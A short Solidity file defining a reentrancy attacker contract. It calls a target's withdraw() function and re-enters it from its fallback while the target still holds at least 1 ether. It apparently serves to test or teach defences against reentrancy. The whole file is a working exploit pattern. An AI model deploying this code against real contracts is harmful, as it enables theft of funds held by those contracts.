// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

interface ITarget {
    function withdraw() external;
}

contract ReentrancyAttacker {
    ITarget public target;

    constructor(address _target) {
        target = ITarget(_target);
    }

    // Attempt recursive attack
    fallback() external payable {
        if (address(target).balance >= 1 ether) {
            target.withdraw();
        }
    }

    function attack() external {
        target.withdraw();
    }
}